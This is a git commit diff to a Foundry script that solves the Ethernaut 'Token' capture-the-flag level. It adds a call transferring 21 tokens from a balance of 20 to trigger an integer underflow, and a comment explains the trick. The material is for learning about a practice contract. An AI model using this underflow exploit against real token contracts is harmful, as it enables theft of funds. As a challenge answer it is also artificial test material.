b818f9dc0cc32aab6c300a6167bd89dc3550710a
MaxKuo <max2571112@gmail.com>
2024-03-29 23:13:58 +0800

    finish 05-Token Challege

--- script/solutions/05-Token.s.sol
+++ script/solutions/05-Token.s.sol
@@ -5,6 +5,9 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IToken {
+    function transfer(address, uint) external returns (bool);
+}
 
 contract TokenSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
@@ -16,8 +19,11 @@ contract TokenSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
-
+        /* in this challenge we use the overflow/underflow problem to make out token big,
+           bcz we had 20 at the start of the challenge, 
+           so we can transfer 21 tokens to make underflow happen to pass the challenge!
+        */
+        IToken(challengeInstance).transfer(challengeInstance, 21);
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
